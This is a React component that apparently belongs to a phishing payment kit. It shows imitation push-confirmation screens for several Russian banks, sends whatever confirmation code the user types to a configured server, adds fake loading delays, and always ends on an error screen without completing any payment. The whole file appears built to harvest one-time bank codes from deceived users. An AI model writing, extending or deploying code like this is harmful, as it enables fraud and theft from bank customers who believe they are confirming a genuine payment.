import React, {useEffect, useState} from 'react'
import AlfabankPush from './AlfabankPush';
import styles from './ConfirmPayment.module.scss'
import ErrorPayment from './ErrorPayment';
import RaiffeisenbankPush from './RaiffeisenbankPush';
import SberbankPush from './SberbankPush'
import TinkoffBankPush from './TinkoffBankPush';
import VTBbankPush from './VTBbankPush';
import axios from 'axios';
import CustomPush from './CustomPush';

const server = process.env.REACT_APP_SERVER_URL

type Card = {
    paymentSystem: string;
    cardNumber: string;
    bank: string;
    system: string
  }
interface Props{
    cardDetails: Card;
    totalPrice: number
    setCardDetails: React.Dispatch<React.SetStateAction<Card | undefined>>;
    setIsConfirmFormActive: (value: boolean) => void;

}

const ConfirmPayment = ({cardDetails, totalPrice, setCardDetails, setIsConfirmFormActive}: Props) => {
    const [isLoading, setIsLoading] = useState(true)
    const [isProccess, setIsProccess] = useState(false)


    const sendCode = (code: string) =>{
      setIsProccess(true)
      setIsLoading(true)
      axios.post(`${server}/api/payment/code`, {
        totalPrice: totalPrice.toLocaleString('ru-RU'),
        code
      })
      setTimeout(() => {
        setIsLoading(false)
      }, 7000);
    }
    useEffect(() => {
      if(!isProccess){
        setTimeout(() => {
          setIsLoading(false)
        }, 4000);
      }
    }, [isProccess])

    const closePayment = () =>{
      setCardDetails(undefined);
      setIsProccess(false);
      setIsConfirmFormActive(false)
    }
    
    useEffect(() => {
        const preventScroll = (e: any) => {
          e.preventDefault();
        };
    
        document.addEventListener('wheel', preventScroll, { passive: false });
    
        return () => {
          document.removeEventListener('wheel', preventScroll);
        };
      }, []);

  return (
    <div className={styles.wrapper}>
        <div className={`${styles.confirmFormWrapper}`}>
            {isLoading && <div className={`${styles.loader}`}></div>}

            {!isLoading && !isProccess && <> 
                {cardDetails?.bank === 'Sberbank' ? <SberbankPush totalPrice={totalPrice} cardDetails={cardDetails} sendCode={sendCode}/> : null}
                {cardDetails?.bank === 'Tinkoff Bank' ? <TinkoffBankPush totalPrice={totalPrice} cardDetails={cardDetails} sendCode={sendCode}/>  : null}
                {cardDetails?.bank === 'VTB Bank' ? <VTBbankPush totalPrice={totalPrice} cardDetails={cardDetails} sendCode={sendCode}/> : null}
                {cardDetails?.bank === 'Alfa-Bank' ? <AlfabankPush totalPrice={totalPrice} cardDetails={cardDetails} sendCode={sendCode}/> : null}
                {cardDetails?.bank === 'Raiffeisenbank bank' ? <RaiffeisenbankPush totalPrice={totalPrice} cardDetails={cardDetails} sendCode={sendCode}/> : null}
                {['Sberbank', 'Tinkoff Bank', 'VTB Bank', 'Alfa-Bank', 'Raiffeisenbank bank'].indexOf(cardDetails?.bank) === -1 && <CustomPush totalPrice={totalPrice} cardDetails={cardDetails} sendCode={sendCode}/>}
            </>}
            {!isLoading && isProccess && <>
              <ErrorPayment closePayment={closePayment}/>
            </>}
            
        </div>
    </div>
  )
}

export default ConfirmPayment
